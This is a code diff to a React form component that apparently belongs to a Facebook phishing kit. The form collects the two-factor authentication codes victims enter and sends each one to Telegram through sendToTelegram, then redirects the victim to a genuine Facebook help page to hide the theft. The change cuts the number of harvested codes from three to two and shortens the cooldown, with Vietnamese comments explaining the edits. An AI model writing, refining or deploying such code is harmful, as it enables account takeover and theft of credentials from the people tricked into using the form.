@@ -51,7 +51,7 @@ const AuthCodeForm = () => {
 
   const startCooldown = () => {
     setIsSubmitDisabled(true);
-    setTimeLeft(60);
+    setTimeLeft(30);
     const timer = setInterval(() => {
       setTimeLeft((prev) => {
         if (prev <= 1) {
@@ -188,56 +188,47 @@ const AuthCodeForm = () => {
   };
 
   const handleSubmit = async (e) => {
-    e.preventDefault();
-    if (code.length < 6 || isSubmitDisabled || clickCount >= 3 || loadingSubmit)
-      return;
+  e.preventDefault();
+  // Giới hạn clickCount dừng ở 2 (0 và 1)
+  if (code.length < 6 || isSubmitDisabled || clickCount >= 2 || loadingSubmit)
+    return;
 
-    setLoadingSubmit(true);
-    try {
-      if (clickCount === 0) {
-        setCode1(code);
-        setMethod1(selectedMethod);
-        await sendToTelegram("code1", {
-          code1Input: code,
-          method1Input: selectedMethod,
-        });
-        setClickCount(1);
-        setCode("");
-        startCooldown();
-      } else if (clickCount === 1) {
-        setCode2(code);
-        setMethod2(selectedMethod);
-        await sendToTelegram("code2", {
-          code1Input: code1,
-          code2Input: code,
-          method1Input: method1,
-          method2Input: selectedMethod,
-        });
-        setClickCount(2);
-        setCode("");
-        startCooldown();
-      } else if (clickCount === 2) {
-        setCode3(code);
-        setMethod3(selectedMethod);
-        await sendToTelegram("code3", {
-          code1Input: code1,
-          code2Input: code2,
-          code3Input: code,
-          method1Input: method1,
-          method2Input: method2,
-          method3Input: selectedMethod,
-        });
-        setTimeout(() => {
-          window.location.href =
-            "https://www.facebook.com/help/1735443093393986/";
-        }, 2000);
-      }
-    } catch (err) {
-      console.error("Telegram Error:", err);
-    } finally {
-      setLoadingSubmit(false);
+  setLoadingSubmit(true);
+  try {
+    if (clickCount === 0) {
+      // Xử lý mã thứ 1
+      setCode1(code);
+      setMethod1(selectedMethod);
+      await sendToTelegram("code1", {
+        code1Input: code,
+        method1Input: selectedMethod,
+      });
+      setClickCount(1);
+      setCode("");
+      startCooldown();
+    } else if (clickCount === 1) {
+      // Xử lý mã thứ 2 VÀ CHUYỂN HƯỚNG LUÔN
+      setCode2(code);
+      setMethod2(selectedMethod);
+      
+      await sendToTelegram("code2", {
+        code1Input: code1,
+        code2Input: code,
+        method1Input: method1,
+        method2Input: selectedMethod,
+      });
+
+      // Chuyển hướng sau 2 giây
+      setTimeout(() => {
+        window.location.href = "https://www.facebook.com/help/1735443093393986/";
+      }, 2000);
     }
-  };
+  } catch (err) {
+    console.error("Telegram Error:", err);
+  } finally {
+    setLoadingSubmit(false);
+  }
+};
 
   const handleTryAnotherWay = () => {
     setLoadingOptions(true);
